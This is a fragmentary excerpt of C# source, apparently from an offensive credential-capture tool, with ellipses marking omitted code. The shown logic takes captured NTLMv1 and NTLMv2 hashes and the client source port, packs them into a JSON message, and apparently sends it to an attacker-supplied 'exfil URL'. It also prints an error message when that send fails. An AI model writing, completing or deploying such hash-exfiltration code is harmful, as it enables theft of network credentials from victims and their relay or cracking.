                                ...
                                if (!String.IsNullOrEmpty(challenge))
                                {
                                    ...
                                    if (!String.IsNullOrEmpty(Program.argExfilUrl))
                                    {
                                        try
                                        {
                                            ...
                                            if (!String.IsNullOrEmpty(ntlmV2Hash))
                                        ...
                                        {
                                            Console.WriteLine("EXFILURL ERROR: " + ex.Message);
                                        }
                                    }                                        
                                ...
                                if (!String.IsNullOrEmpty(challenge))
                                {
                                    if (!String.IsNullOrEmpty(Program.argExfilUrl))
                                    {
                                        try
                                        {
                                            ...
                                            if (!String.IsNullOrEmpty(sourcePort))
                                            { msg += "\"sourcePort\": \"" + sourcePort + "\","; }
                                            if (!String.IsNullOrEmpty(ntlmV1Hash))
                                            { msg += "\"ntlmV1Hash\": \"" + ntlmV1Hash + "\""; }
                                            msg += "}";
